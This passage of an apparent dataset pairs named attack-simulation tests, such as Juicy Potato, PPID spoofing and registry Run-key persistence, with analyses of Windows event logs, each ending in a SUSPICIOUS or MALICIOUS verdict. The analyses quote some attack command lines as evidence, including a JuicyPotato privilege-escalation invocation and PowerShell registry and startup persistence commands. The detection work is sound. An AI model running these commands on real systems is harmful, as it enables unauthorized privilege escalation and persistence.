   - The logs show multiple instances of Microsoft Edge Update executables being run. While frequent update checks could be normal, this activity should be verified to ensure it corresponds with expected behavior, especially considering the directory `C:\Program Files (x86)\Microsoft\Temp\`.

### Application Logs:

- **EdgeUpdate Service Stopped:**
   - Mentions of ""Service stopped"" by `edgeupdate`, which may simply correspond to the normal update process. However, when combined with other suspicious activities, the integrity of these records should be verified.

### Security Logs:

- **System Time Change:**
   - There are multiple `EventID 4616` logs indicating that the system time was altered. This is generally suspicious as attackers may alter system time to evade logs synchronization or evade detection tools.

### System Logs:

- **Service Control Manager (EventID 7009 and 7000):**
   - Indicates that there was a timeout when attempting to start the ""Fax"" service. Coupled with the previously observed sc.exe modification, this provides further evidence that this service was manipulated.

### Conclusion and Recommendation:

Based on the analysis, there is significant evidence of suspicious activities that suggest potential malicious behavior:

1. The manipulation of the Fax service via command-line to execute PowerShell commands is a strong indicator of potentially malicious activity, especially since this is a known technique for privilege escalation.
2. The rapid sequence of wevtutil and conhost executions may point towards an intention to tamper with or clear event logs.
3. Timechange logs add to the suspicion of attempts to misdirect potential investigations or mitigate logging.

**Resolution: SUSPICIOUS**

Guidance for further actions:
- Conduct a full forensic analysis on the affected system, focusing on the persistence mechanisms and lateral movement activities.
- Review user access and behavior, especially the `admin_test` account.
- Ensure that event log settings and service configurations are restored to their secure states, along with applying relevant security patches.
- Monitor network traffic for anomalies or data exfiltration attempts following this suspicious activity."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"Upon analysis of the provided Windows event logs, several indicators of potentially malicious activity were identified. Here is a detailed analysis of the logs:

### Suspicious Activities:
1. **PowerShell Commands:**
   - A particular PowerShell command is of interest due to its use of `CreateRemoteThreadNative.exe` and `werfault.exe`. The command attempts to start werfault.exe (typically a legitimate process for Windows Error Reporting) and then a suspicious executable `CreateRemoteThreadNative.exe` is used to interact with it, indicating potential process injection or exploitation. This could be an attempt to execute code in the context of a legitimate process to evade detection.

2. **Use of Debugging Privileges:**
   - The `SeDebugPrivilege` is present in the logs associated with the user `admin_test`. `SeDebugPrivilege` is a high-risk privilege that allows a user to debug and modify the memory of other processes, which can be used maliciously for process injection and other exploitative actions.

3. **Time Change Events:**
   - There are kernel time changes logged, which can be indicative of an attempt to evade time-based analysis detection or handle time manipulation for some other malicious purposes.

4. **Frequent Process Creation:**
   - The frequent creation of processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and especially `CreateRemoteThreadNative.exe` is suspect. While some of these processes can have legitimate use cases, their specific invocation in this context raises suspicion of enumeration and potential tampering with system logs or settings.

5. **Sysmon Logs:**
   - There are multiple entries associated with `werfault.exe` and `CreateRemoteThreadNative.exe`, reinforcing the suspicion that these processes are involved in some abnormal behavior.

### Assessment:
- The combination of using PowerShell to potentially inject code into a legitimate system process (`werfault.exe`), the presence of sensitive debugging privileges, suspicious time modification, and frequent related process activities are strong indicators of suspicious and potentially malicious activity.

### Resolution:
- **Resolution: MALICIOUS**: The activity noted, particularly the PowerShell script that attempts to execute code within another process using potentially malicious executables, and the use of heightened privileges strongly suggest an attempt to compromise the system.

### Guidance on How to Proceed:
1. **Isolation:**
   - Isolate `Server002` from the network immediately to prevent potential lateral movement or further compromise.

2. **Detailed Investigation:**
   - Conduct a comprehensive forensic analysis on `Server002`. Look into the version and source of the `CreateRemoteThreadNative.exe`, identify other systems potentially affected, and retain evidence for further analysis.

3. **Memory and Process Analysis:**
   - Perform memory analysis to identify any malicious payloads that might be running and investigate any injected processes.

4. **Review Privileges and Access Controls:**
   - Review privilege assignments, especially focusing on the use of `admin_test` and assess if there is more extensive misuse of elevated privileges.

5. **Patch and Hardening:**
   - Ensure that all software, especially OS and security tools, are updated. Increase monitoring and adopt enhanced threat detection mechanisms.

6. **Incident Response:**
   - Initiate a full incident response procedure to deal with the current compromise and to strengthen defenses against future attacks."
Leverage Virtual Channels to execute custom DLL during successful RDP session,"After reviewing the provided Windows event logs, I conducted a detailed analysis to identify any suspicious or malicious activity.

### Analysis

1. **System Time Adjustments:**
   - The system log records two timestamp adjustments. While odd time changes can suggest tampering or time-wrapped malware hunting for security solutions, these changes align with standard time service updates (`EventID 1` and `EventID 35`), indicating adjustments to synchronize with an external NTP source (`time.windows.com`).
   - **Assessment: Benign**

2. **Edge Update Processes:**
   - The Sysmon log details numerous entries related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). These generally appear routine for automatic update mechanisms.
   - The presence of processes being executed by `NT AUTHORITY\SYSTEM` suggests legitimate system-level operations tailored to update software and should not be immediately flagged as malicious without additional indicators.
   - **Assessment: Benign**

3. **Registry Modification:**
   - The Sysmon logs show a command executed by `cmd.exe` to modify the registry (`reg add`) under the user's context (`SERVER002\admin_test`), creating the registry key `HKCU\Software\Microsoft\Terminal Server Client\Default\Addins\Malware`.
   - The naming of the key ('Malware') is highly suspicious, indicating possible registry alteration for persistence or malicious use.
   - **Assessment: Suspicious**

4. **Various Executable Invocations:**
   - Several invocations of default Windows tools like `hostname.exe`, `whoami.exe`, `conhost.exe`, and others, initiated by `SERVER002\admin_test`. While standalone executions are not directly harmful, the context or chain of execution could reveal suspicious behavior.
   - No direct evidence of these actions being used maliciously is apparent, but chaining commands or unexpected usage might indicate misuse.
   - **Assessment: Requires Contextual Analysis (likely benign operations due to the current context)**

### Conclusion
Based upon the logs, the most immediate concern arises from the suspicious registry modification attempting to establish a key under suspicious nomenclature. This activity raises a red flag for further investigation, addressing potential unauthorized access, or indicators of compromise aiming to establish persistence or prepare for credential theft.

### Resolution
- **Resolution: SUSPICIOUS**

### Guidance
1. **Investigation:** Conduct a deeper investigation into the context of the registry modification with special emphasis on who executed the command and why the key was named 'Malware'.

2. **Monitoring:** Implement close monitoring of processes initiated by the `admin_test` user and track any unusual patterns or access attempts.

3. **Registry Audit:** Review recent registry modifications and set alerts to quickly identify future unauthorized changes.

4. **Threat Intelligence:** Correlate log data with threat intelligence feeds to identify any known indicators of compromise or corroborate suspicious behavior.

Proceed with caution and ensure adequate incident response capabilities are prepared to address any potential threats identified from these investigations."
HKLM - Policy Settings Explorer Run Key,"Upon reviewing the provided event logs, a few unusual and potentially concerning activities have been identified that warrant further scrutiny:

1. **Wevtutil.exe and Conhost.exe Activity**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes being executed almost simultaneously by the user `SERVER002\admin_test`. While these are legitimate Windows processes, the rapid and repeated execution of these processes in quick succession can sometimes indicate attempts to manipulate or query event logs, which is a common tactic used by attackers to cover their tracks. This pattern of execution is atypical for standard administrative actions.

2. **PowerShell Execution**:
   - The logs show that a PowerShell command was executed with elevated privileges. The command modifies the Windows registry to add an entry for executing `calc.exe` upon user login (`""Set-ItemProperty -Path \""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"" -Name \""filetest\"" -Value \""C:\\Windows\\System32\\calc.exe\""""`) using the `Test-Path` condition.
   - This kind of activity is highly suspicious as it can be indicative of persistence mechanisms being set by malicious entities. Altering the registry to execute processes upon login is a known tactic for establishing persistence on compromised systems.

3. **Account and Privilege Activity**:
   - The user `admin_test` has been granted several high-level privileges, such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeLoadDriverPrivilege`, among others. While this can be legitimate for administrative users, in conjunction with the other activities noted, it could be indicative of privilege misuse.

4. **Time Discrepancy**:
   - There are logs showing modifications to the system time (`EventID 1` and `EventID 4616`). Changing system time can be legitimate, such as in the case of synchronization issues, but it can also be used to manipulate logs or evade detection by altering timestamps.

**Assessment and Guidance**:
- **SUSPICIOUS**: The logs contain activities that do not appear to be entirely normal, especially considering the PowerShell command execution and registry modifications performed by an administrative account. This could suggest either a script or a direct attacker action to gain persistence.
  
**Recommended Actions**:
1. **Further Investigation**: Conduct a deeper investigation into the `admin_test` account activity across the network to determine if similar patterns exist on other systems.
2. **Review User Actions and Intent**: Verify whether the commands executed were authorized and part of a legitimate administrative task.
3. **File and System Integrity Check**: Run a thorough malware scan and integrity check on the host to ensure no malicious code persists.
4. **Audit Logs and Permissions**: Inspect logs around the time discrepancy for potential tampering, and review current privileges assigned to the `admin_test` account to ensure they align with the user's job function.
5. **Registry Changes and Persistence Mechanisms**: Review systems for unauthorized registry changes or unexpected persistence methods and remove them if identified.

This assessment should be shared with your incident response team to take appropriate follow-up actions based on internal policies and procedures."
Snake Malware Kernel Driver Comadmin,"Upon review of the provided Windows event logs, the following observations and analysis have been made:

### Suspicious Indicators

1. **PowerShell Activity:**
   - There are multiple events indicating the execution of a PowerShell command aimed at creating a directory and writing random bytes to a file named `comadmin.dat` within the `system32\Com` directory. This action of writing random data to a file in a system directory is unusual and could be indicative of a tactic used in various attacks, such as hiding data or preparing for a future attack.
   - The PowerShell commands do not provide details about being executed by a known service or administrator that would typically perform such operations, thus raising concerns about unauthorized use or script execution.
   
2. **Sysmon Logs - Process Creation and Terminations:**
   - The logs indicate consistent and repeated usage of `C:\Windows\System32\conhost.exe`, `C:\Windows\System32\wevtutil.exe`, and `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by a user `SERVER002\admin_test`. Though these processes on their own are not inherently malicious, their usage patterns, context, and sequence should be cross-examined with administrator records to ensure legitimacy. Especially, `wevtutil.exe` is used for manipulating event logs, and its invocation could imply tampering.
   - The execution of standard utilities like `whoami.exe` and `hostname.exe` might not be malicious per se, but depending on the context, such operations could be part of a reconnaissance or evasion phase by a malicious actor.

3. **Edge Update Processes:**
   - A series of Edge Update services and processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_*`) run as `NT AUTHORITY\SYSTEM`. While these are legitimate processes for updating Microsoft Edge, the frequency and intensity could be noteworthy. Ensure these updates were expected and approved, especially since updates can attempt to escalate privileges or modify system components.

### Risk and Conclusion

The execution of PowerShell with an unusual command, coupled with the presence of processes that typically do not communicate overtly unless tampering with event logs or running scripts, creates a suggestive profile of suspicious activity. Although there's no evidence pointing conclusively to a compromise, this set of logs in combination suggests an environment where potentially unauthorized or unintended activity is happening.

### Resolution

**SUSPICIOUS**

### Guidance on How to Proceed

1. **Further Investigation:**
   - Conduct a detailed investigation into the source of the PowerShell script execution, including user verification and the purpose of the script.
   - Review administrative activities around the times these logs were generated, ensuring they align with authorized tasks.
   - Examine Enterprise Governance, Risk, and Compliance (GRC) records to ensure Microsoft Edge update activities align with known update schedules.

2. **Monitoring:**
   - Implement tighter monitoring of PowerShell execution on Server002.
   - Increase alerts for system directory modifications and unexpected script executions.

3. **Policy Enforcement:**
   - Review and, if necessary, enforce stricter policies on user roles and script execution through PowerShell or other scripting tools.

4. **Security Patches:**
   - Ensure all systems are up-to-date with the latest security patches, and review current threat advisories that might align with this behavior pattern.

This thorough review and careful follow-up will help ascertain whether there is an ongoing threat and mitigate potential risks to the system."
Parent PID Spoofing - Spawn from Current Process,"After thoroughly reviewing the provided Windows event logs, here is a detailed analysis focusing on potentially suspicious or anomalous activities observed:

### 1. **Windows PowerShell Logs:**
- **Suspicious Command Execution:** 
  - All PowerShell events contain the command line execution with `Start-ATHProcessUnderSpecificParent`. This command is not a standard PowerShell operation and might indicate an attempt to execute a process under a specific parent as a form of process injection or evasion technique.
  - Also, the command `Start-Sleep 10` is benign by itself, yet when combined with the obscure command mentioned above, it raises concerns about its intended purpose.

### 2. **Sysmon Logs:**
- **Rapid Process Creations:** 
  - A series of processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are spawned around the same timestamp. While individually benign, the clustering and variety of these processes suggest a script or automated task that may be running.
  - PowerShell being executed repeatedly and its parent being `wsmprovhost.exe` might indicate a remote management session, which although could be legitimate, should be verified if it was expected.

### 3. **System Logs:**
- **Multiple Windows Updates:**
  - Frequent updates appearing with event ID 44 typically indicate regular updates; however, they coincide with the PowerShell and Sysmon activity temporally.
  
### 4. **Security Logs:**
- **Unsuccessful Credential Attempts:** 
  - A series of Event ID 5379 indicates several failed attempts to access credentials for the MicrosoftAccount and WindowsLive, which might indicate attempt at information gathering or unauthorized access (ReturnCode `3221226021` denotes an access denied).
  
### 5. **Application Logs:**
- **Software Protection Platform Event:**
  - The Event ID 16394 logged by the Software Protection Platform Service, while common, needs cross-checking to ensure there was no manipulation attempted related to software licensing (it’s happening shortly after the potential unauthorized PowerShell activity).

### Conclusion and Recommendation:
The log activities hint towards potentially suspicious activities, notably the exotic PowerShell commands and the sequence of process executions. While no definitive malicious actions are confirmed, the logs display characteristics that could align with pre-attack phases in a threat model (e.g., reconnaissance, privilege attempts).

### Resolution: **SUSPICIOUS**

Given these observations, the activity requires further investigation:

- **Verify the Intent of PowerShell Commands**: Check if the scripts executed are part of an admin’s duties or an automated security task.
- **Review User Admin_test Activity**: Profile the typical behavior of `admin_test` user around the periods of observed activity.
- **Cross-reference with Known Threats**: Ensure that the `Start-ATHProcessUnderSpecificParent` isn't aligning with known malicious scripts.
- **Verify with Remote Management Policies**: Ensure remote management (if any) aligns with organizational security policies.

Proceed with a containment and monitoring strategy to ensure any potential threat is neutralized. Consider implementing stricter PowerShell logging and user activity monitoring to detect any future anomalous behavior swiftly."
Access Token Manipulation,"### Detailed Analysis

#### Sysmon Logs
1. **PowerShell Execution**: 
    - **EventID 1** for PowerShell execution (`2024-10-25 11:40:55.3016410`): The command line indicates the bypass of the execution policy and includes a suspicious script `GetToken.ps1`. Additionally, it attempts to create a process from the parent of `lsass`, which is a clear sign of credential dumping attempts.
    
    - **Indicators of Malicious Activity**:
      - The use of `Set-ExecutionPolicy -Scope Process Bypass -Force` is a known method to circumvent PowerShell script execution restrictions. 
      - The `GetToken.ps1` script and the attempt to access `lsass` suggest an attempt to access sensitive information, possibly for privilege escalation.
    
2. **Usage of Built-in Utilities**:
    - Regular use of tools like `hostname.exe`, `whoami.exe`, and `conhost.exe` appears benign in isolation as they are common, legitimate Windows utilities. However, in context with suspicious PowerShell activities, they could be used to gather system information post-compromise.

3. **Edge Update and Other System Processes**:
    - Constant activity by `Microsoft Edge Update` processes seems to be normal system behavior for updating purposes. They operate under `NT AUTHORITY\SYSTEM`, which is typical.

#### Windows PowerShell Logs
- **PowerShell Warning**:
  - **EventID 600/403**: Logs detail the execution of potentially harmful PowerShell command lines reflecting activities seen in Sysmon logs, notably the execution policy bypass and the use of `GetToken.ps1`.

#### System Logs

  - There are events related to time changes (`EventID 1`), which are typical for synchronizing time with network time protocol services. No direct indication of malicious activity is found here.

#### Application Logs
- **Edge Update Activity**:
  - No suspicious activity relevant to security threats; logs confirm updates and related services starting or stopping.

#### Security Logs
- **Time Synchronization**:
  - As observed in System logs, security logs also reflect time synchronization details, with no indication of being directly related to malicious activity.

### Assessment
**Findings**:
- The critical finding is the execution of PowerShell with an execution policy bypass and its invocation of `GetToken.ps1`, attempting interaction with `lsass`, indicative of a potential credential theft attempt.

**Threats/Risks Identified**:
- Potential exposure to credential theft due to the `GetToken.ps1` script running from a high-integrity PowerShell session aiming at `lsass`.
- Unauthorized privilege escalation attempts.
  
**Guidance on How to Proceed**:
- Immediate steps would involve:
  - Isolate the machine from the network to prevent lateral movement.
  - Conduct a deeper forensic analysis of `GetToken.ps1` to understand its full functionality.
  - Audit all accounts and change passwords, especially those with high privileges.
  - Review and tighten PowerShell execution policies and monitoring.
  - Implement Enhanced Logging to provide more visibility around PowerShell activities.

### Resolution
- **MALICIOUS**: Given the findings, particularly the suspicious PowerShell activity attempting to interact with `lsass`, the activities observed are consistent with what is usually considered malicious behavior aimed at credential dumping and require immediate investigation and remediation."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"Upon analyzing the provided event logs, the events present a mix of regular system operations along with some potentially questionable activities. Here's a deeper dive into the data:

### Windows PowerShell Logs

The PowerShell-related events indicate a script execution that involves registry manipulation, specifically targeting the `Winlogon` registry key's `Shell` value. The script performs the following actions:
- Retrieves the current value of the `Shell` key.
- Backs it up by storing it in `Shell-backup`.
- Appends `C:\Windows\explorer.exe` to the existing `Shell` value.

This type of behavior can be suspicious as it involves modifying a critical system auto-start location. Such actions could potentially facilitate persistence mechanisms by attackers aiming to execute malicious payloads during the user's login session.

### Sysmon Logs

The Sysmon logs primarily record normal operations of system binaries like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `TiWorker.exe`, etc. However, attention should be drawn to the execution of:
- `powershell.exe` with invocation of the same script as seen in the PowerShell logs. Here the script is further detailed in the command line, which provides insight into registry changes executed by an administrative user.
- Frequent execution of system binaries under `SERVER002\admin_test`, suggesting elevated permissions or usage by an administrative account.

### Security Logs

The security logs illustrate the privilege escalation activities:
- Event ID 4672 shows that the `admin_test` user has escalated privileges, including powerful rights like `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are significant for potential misuse scenarios such as privilege escalation attacks.

### Application & System Logs

The application and system logs indicate routine system operations and application status reports (e.g., Edge Update services).

### Conclusion and Resolution

- **Suspicious/Malicious Activity Identified**: The PowerShell script's modification of the `Winlogon Shell` registry key is suspicious and possibly malicious. Such alterations could allow an attacker persistence on the machine, and the high privileges held by the `admin_test` user are notable.

- **Resolution**: **MALICIOUS**

### Recommendations

1. **Immediate Quarantine**: Isolate the machine from the network to prevent further potential spread or command and control communication.
2. **Registry Examination**: Inspect and restore any unauthorized registry modifications.
3. **User Accounts Review**: Audit the `admin_test` account and other admin accounts for unexplained privileges or unauthorized use.
4. **Thorough System Scan**: Perform a comprehensive malware scan using trusted security software.
5. **Log Analysis and Monitoring**: Continue to monitor system activity, especially PowerShell and other critical processes, and review logs for any further unusual actions.
6. **Enhanced Security Measures**: Implement application whitelisting, enable PowerShell logging, and enforce least privilege principles to minimize exposure to similar risks in the future."
Parent PID Spoofing using PowerShell,"### Detailed Analysis

#### **Security Log Analysis**

1. **Event ID 4624 (Successful Logon)**: 
   - LogonType 5 indicates a service logon, which is normal behavior for system services running under the SYSTEM account.
   - ProcessName: `C:\Windows\System32\services.exe` is a legitimate Windows process.

2. **Event ID 4672 (Special Privileges Assigned)**:
   - SYSTEM account is granted several high-level privileges such as `SeDebugPrivilege`, `SeTcbPrivilege`, etc. This is normal behavior for a service logon with SYSTEM.

3. **Event ID 5379 (Credential Validation Attempt)**:
   - Multiple failed credential validation attempts with return code `3221226021` indicating failed logins. The `MicrosoftAccount` and `WindowsLive` notations suggest attempts to access or synchronize with Microsoft accounts which is quite unusual for a system intended for domain or local user management only, raising potential red flags for behavior deviations.

4. **Event ID 4798 (Enumeration of Local User Accounts)**:
   - `taskhostw.exe` enumerating accounts like `Administrator`, `Guest`, `DefaultAccount`, which could mean some application or script is checking user identities and privileges, typical of various administrative scripts.

#### **Sysmon Log Analysis**

1. **Event ID 1 and 5**:
   - Detected multiple processes launched, notably `PowerShell` executing with a script path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\PPID-Spoof.ps1`. 
   - The script `PPID-Spoof.ps1` indicates potential Process ID (PID) manipulation, known as Parent Process ID (PPID) Spoofing, which is a technique used to masquerade as another process to evade detection, pointing to malicious behavior.
   - Further, the ps1 script executes dll injection using `iexplore.exe` and `calc.dll`, suggesting likely malicious intent to compromise the system.

#### **Windows PowerShell Log Analysis**

- Powershell was used to execute the script `PPID-Spoof.ps1`, confirming the findings in the Sysmon logs.
- PowerShell logs confirm that the script was executed without errors, corroborating the possibility of tampered or malicious activity.

### Assessment and Conclusion

The pattern of activity observed in the logs shows indicators of potentially malicious activity. The use of PowerShell with a PPID spoofing script, the subsequent launch of Internet Explorer with a DLL injection, and the failed login attempts to Microsoft accounts raise concerns about an unauthorized response on the system and potentially compromised accounts.

Given the sophisticated techniques applied, including PPID spoofing and usage of DLLs outside common operating procedures, it psychologically indicates adversarial behavior rather than benign administrative tasks.

### Resolution

**MALICIOUS** - The logs contain strong indicators of malicious activity, suggesting the potential compromise of the Windows host, which necessitates immediate containment actions, thorough examination of systems for additional threats, and escalation to incident response teams.

### Guidance on How to Proceed

1. **Immediate Containment**: 
   - Isolate the host from the network to prevent further propagation of any malicious activity.
   - Assess potential lateral movement risks to other systems.

2. **Forensic Investigation**:
   - Collect and preserve all logs and system artifacts for an in-depth forensic examination.
   - Assess impact and scope to determine any exfiltration or corruption risk.

3. **Mitigation**:
   - Identify and close the vectors used for PowerShell exploitation by tightening security policies.
   - Implement proper segmentation and enhanced logging to monitor processes and script executions in real-time.

4. **Recovery & Reinforcement**:
   - Patch and update all software to the latest versions.
   - Strengthen multifactor authentication and review account security policies. 

5. **Reporting and Compliance**:
   - Document incidents comprehensively and report to necessary compliance and data protection authorities if data breaches are confirmed.

Ultimately, applying these measures will significantly reinforce the security posture and help in transparently managing any compliance requirements."
At.exe Scheduled task,"Based on analysis of the provided event logs, several key points indicate potential suspicious activity:

1. **Event Logs Related to Time Change**: 
   - Security logs (EventID 4616) indicate system time being altered. The `PreviousTime` is ahead of the `NewTime`, which suggests the system clock was set backwards. This action can be indicative of an attempt to manipulate logs for evasive purposes. Time adjustments may indicate preparation for or concealment of malicious activities.

2. **Sysmon Logs Indicating Potentially Malicious Activity**:
   - We see several instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\\admin_test`. While `wevtutil.exe` can be used for legitimate purposes, its execution sequence here, alongside frequent console host spawns, is notably repetitive and excessive.
   - There appears to be a pattern of executing process pairs like `wevtutil.exe` followed by `conhost.exe`. This could indicate script automation or misuse, and should be investigated further.
   - The Sysmon EventID 1 logs show consecutive execution of `whoami.exe` and `cmd.exe`, which are legitimate tools but are often used by attackers for reconnaissance and privilege escalation.
   - The command line `\""cmd.exe\"" /c at 13:20 /interactive cmd` is run under a high integrity level. This could set a scheduled task to run a command line with elevated privileges interactively, potentially to maintain persistence or further attacks.

3. **Application and System Logs Consistent Behavior**:
   - The Application logs show software protection platform activity which is common and expected as part of regular Windows operations.
   - The system logs largely focus on time zone and clock adjustments, reiterating earlier observations from security logs.

**Conclusion**:
- Overall, the combination of altering system time, excessive execution of administrative utilities (`wevtutil.exe`, `cmd.exe`, and `at.exe`), and high integrity process execution indicate potentially suspicious activity.

Based on this assessment, the logs show activity that could be indicative of malicious intent or misuse of privileges, but does not provide conclusive evidence of a definite attack. The described actions warrant further investigation to determine intent and potential compromise areas.

**Resolution**: SUSPICIOUS  
- **Recommendation**: Further analysis should be conducted, focusing on correlating these findings with any network logs, examining user activity logs for `SERVER002\\admin_test`, and checking for scheduled tasks or alterations in system settings. Consider setting forensic traps or alerts for similar suspicious behavior in the future."
Domain Password Policy Check: No Lowercase Character in Password,"Based on the provided Windows event logs, here's a detailed assessment:

1. **Microsoft Edge Installer Activity**: 
   - The logs are showing a series of events where a process related to Microsoft Edge Installer (`setup.exe`) is being executed from a temporary directory and various Edge update directories. This activity is consistent with a legitimate software update process for the Microsoft Edge browser. The process is running under the `NT AUTHORITY\SYSTEM` user, which is typical for system-level updates initiated by update services.

2. **PowerShell Script Execution**:
   - There are several PowerShell events involving the execution of a script, which is attempting to check for a password file and change an Active Directory account password to ""UPPER-LONG-SPECIAL-333."" The logs also show attempts to store new credentials to a file.
   - The script is being executed by the user `SERVER002\admin_test`, which could imply an administrative or maintenance task. However, the fact that it deals with credential management and directly manipulates Active Directory passwords is unusual and worth investigating further.

3. **Execution of System Utilities**:
   - Processes such as `wevtutil.exe` (event log utility) and `whoami.exe` (displays current username) executed by the `SERVER002\admin_test` user suggest someone might be inspecting the event logs or checking the current user context. While not inherently suspicious, this might indicate manual admin activities or troubleshooting.

Noticeable Anomalies:
- The PowerShell script's behavior is unconventional for routine IT operations due to direct manipulation of AD account passwords using a script, which could be an attempt to maintain unauthorized access.
- Frequent launches of system tools (`wevtutil.exe` and `whoami.exe`) might suggest attempts to evade detection or audit changes.

Recommendation for Further Investigation:
- Verify the legitimacy of the PowerShell script and the context in which it was run. Check if this operation is part of any automated task or if it could indicate unauthorized access or misconfiguration.
- Cross-check user activity and permissions for the user `SERVER002\admin_test` to ensure no unauthorized privilege escalation occurred.
- Inspect the associated systems for any unauthorized modifications or unscheduled updates, particularly relating to credential files in user directories.

**Resolution**: SUSPICIOUS

The identified PowerShell activity and its interaction with system credentials are unusual and should be investigated to ensure system integrity. The Microsoft Edge update activities appear benign, but the context of the entire script execution and system utilities usage is suspicious and necessitates further review."
Juicy Potato,"### Detailed Analysis of Logs

#### Suspicious Behavior:

1. **Usage of JuicyPotato:**
   - The logs reveal the execution of `JuicyPotato.exe`, a well-known privilege escalation tool often used by attackers to exploit the Windows COM server vulnerability for escalating local privileges.
   - Event logs indicate the execution of Powershell with the command `powershell.exe & {cmd /c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}`.
   - This demonstrates clear malicious intent aiming to gain SYSTEM level privileges unauthorized.

2. **Command Line Execution:**
   - The command shown above runs JuicyPotato with parameters likely intended for privilege escalation. The use of encoded PowerShell scripts with external executables is often indicative of evasion tactics. 
   - Furthermore, the application ""notepad.exe"" is used as a proxy process which is unconventional and potentially indicates suspicious use to evade detection or blend in with legitimate process structures.

3. **Anomalous Process Activity:**
   - Multiple consecutive executions of ""MicrosoftEdgeUpdate.exe"" and associated helper processes in obscure directories (e.g., ""C:\Program Files (x86)\Microsoft\Temp\"") and custom temporary paths underscore potential attempts at code execution impersonating legitimate software updates or leveraging legitimate software pathways for payload delivery.

#### Indicators of Compromise:
- **Privileged Commands**: The use of `JuicyPotato.exe` is a strong indicator of exploitation for privilege escalation.
- **Specific Environment Paths**: The use of unconventional file paths like the Temp directory for execution further raises red flags for potential lateral movement preparation.

### Assessment:
After analyzing the series of events listed above, the presence and execution method of `JuicyPotato.exe` clearly indicate that there has been unauthorized exploitation on the system. This is conclusive of a malicious operation spearheaded to gain escalated privileges within the Windows host environment. 

### Conclusion:
- **Resolution**: MALICIOUS

### Recommendations and Guidance to Proceed:
1. **Immediate Isolation**: Disconnect the affected host from the network to prevent potential lateral movement or data exfiltration.
2. **Forensic Investigation**: Conduct a thorough forensic investigation to establish the full scope of the breach.
3. **Credential Audit**: Since JuicyPotato attempts to gain elevated privileges, passwords and authentication tokens should be changed immediately.
4. **Review and Harden Group Policies**: Particularly focus on tightening security related to COM servers and ensure proper use of access tokens.
5. **Endpoint Monitoring and Threat Hunting**: Enhance or deploy endpoint detection and response tools to monitor for signs of similar activity across other hosts in the network.
6. **Update Security Measures**: Ensure all systems are updated and patched against vulnerabilities exploited by privilege escalation tactics used by such malicious tools.

This analysis should be communicated to all stakeholders, and further incident response actions should be coordinated according to the organization’s security policy."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Upon reviewing the provided Windows event logs, I have identified certain activities that suggest suspicious behavior and potential signs of compromise.

### Analysis:

#### Application Logs:
- No significant indicators of compromise were observed in the Application logs. The logs capture standard service operations related to Microsoft Edge updates.

#### PowerShell Logs:
- Repeated PowerShell executions with the following commands are noted:
  - Creating a directory in the temporary path: `New-Item -ItemType Directory -path ""$env:TMP\\filetest\\""`
  - Copying an executable (Calculator) to the newly created directory: `Copy-Item -path ""C:\\Windows\\System32\\calc.exe"" -destination ""$env:TMP\\filetest\\""`
  - Modifying a registry key related to user shell folders startup settings: 
    - `Set-ItemProperty -Path ""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"" -Name ""Common Startup"" -Value ""$env:TMP\\filetest\\""`

These actions, particularly copying an executable to a temporary directory and reconfiguring startup entries in the registry, are consistent with tactics used by some malware to establish persistence. This activity is anomalous and warrants further investigation.

#### Security Logs:
- Time change events involving `svchost.exe` are noted. While time changes can be normal for maintaining system integrity, they can also be indicative of lateral movement or evasion techniques if conducted arbitrarily. This should be further correlated with other logs if unusual patterns emerge.

#### System Logs:
- No unusual activities were detected, primarily logging time synchronization with external sources (e.g., `time.windows.com`) which aligns with expected system behavior.

#### Sysmon Logs:
- Noteworthy activities include:
  - Multiple executions of system utilities and PowerShell with high integrity levels by the `SERVER002\admin_test` user.
  - The repeated execution of Microsoft Edge Update processes seems normal, likely related to scheduled updates or installations.
  - The use of `wevtutil.exe` and `conhost.exe` also appears prevalent. These are legitimate Windows utilities often utilized for managing event logs and console windows, respectively. However, the context of their execution alongside the suspicious PowerShell activities above raises concerns that should be scrutinized.

### Assessment:
Based on the detailed analysis, there is evidence suggestive of suspicious activity, particularly concerning the PowerShell script execution. The presence of actions that manipulate startup behaviors and copy executables to uncommon directories may indicate initial steps towards persistence and potential compromise. Additionally, the high integrity level associated with these processes can enable substantial alterations to the system's state, which should be justified by legitimate administrative tasks - if not, they could be cause for concern.

### Conclusion:
- **Resolution:** SUSPICIOUS
- These activities do not immediately constitute concrete proof of malicious intent but are concerning enough to mandate thorough investigation. Further steps should include:
  - Conducting deeper forensic analyses on system changes.
  - Cross-referencing with threat intelligence feeds for known IoCs.
  - Engaging any involved users, such as `admin_test`, and verifying the legitimacy of their actions.
  - Monitoring for any other abnormal behavior or unexpected changes in system state.

It is recommended to maintain an increased level of scrutiny on Server002 and consider implementing layered security controls to detect and prevent any advancement of this potentially malicious activity."
Suspicious vbs file run from startup Folder,"### Detailed Analysis:

#### 1. Windows PowerShell Log:

- **Suspicious Command Execution**: The repeated execution of PowerShell commands (`Copy-Item` and `cscript.exe`) to copy and execute a VBScript file (`vbsstartup.vbs`) in the Startup directories (`$env:APPDATA` and `C:\ProgramData`) is suspicious. Placing scripts in the `Startup` directory ensures they run every time the system boots, often a technique used by threat actors to maintain persistence.

#### 2. Sysmon Log:

- **Process Creation and Execution**: The execution of `cscript.exe` to run `vbsstartup.vbs` immediately following the PowerShell events suggests a potential automated process related to the copying commands.
